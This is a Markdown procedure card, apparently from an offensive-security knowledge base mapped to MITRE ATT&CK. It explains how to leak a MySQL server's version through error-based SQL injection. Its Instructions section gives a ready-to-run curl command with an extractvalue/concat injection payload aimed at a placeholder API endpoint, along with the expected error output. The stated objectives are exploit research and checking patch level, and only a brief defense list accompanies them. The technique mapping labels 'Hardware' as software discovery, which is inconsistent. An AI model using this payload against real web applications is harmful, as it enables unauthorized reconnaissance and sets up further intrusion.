---
id: proc-uuid-002
name: Leak-MySQL-Version-via-SQL-Injection
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.503Z'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Hardware]]'
sub_techniques: []
tags:
  - sqli
  - version-leak
  - mysql
commands:
  - '[[commands/curl-leak-version]]'
platforms:
  - Web
  - MySQL
tools: []
skill_level: intermediate
impact_level: medium
detection_risk: high
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Hardware]]'
---

# Leak-MySQL-Version-via-SQL-Injection

## Summary

This procedure modifies the initial SQL injection payload to leak the MySQL server version, aiding in tailoring further exploits.

## Description

Building on the user leak, replace user() with version() in the SELECT clause. The extractvalue error will embed the version string, e.g., 8.0.23, confirming the backend and potential vulnerabilities.

## Requirements

1. Successful Step 1 (user leak) to validate endpoint
2. HTTP client like curl
3. Target URL accessible

## Defense

- Sanitize inputs in API parameters
- Disable detailed error messages in production (e.g., MySQL sql_mode)
- Log and alert on repeated 500 errors from the same IP

## Objectives

1. Gather software version for exploit research
2. Confirm MySQL as backend
3. Assess patch level

## Instructions

### Step 1: Modify and Execute Payload

**Context**: Change the select clause to version() to trigger version leak in error.

**Command** ([[commands/curl-leak-version]]):
```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa" -H "Host: target.com" -H "User-Agent: Mozilla/5.0"
```

> Expected: Error message with 'XPATH syntax error: ":8.0.23"', revealing version 8.0.23.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Hardware]] Software Discovery: Gather Victim Host Information

### Sub-Techniques


## Commands Used

- [[commands/curl-leak-version]]

## Tools Used


## Tags

- [[sqli]]
- [[version-leak]]
- [[mysql]]
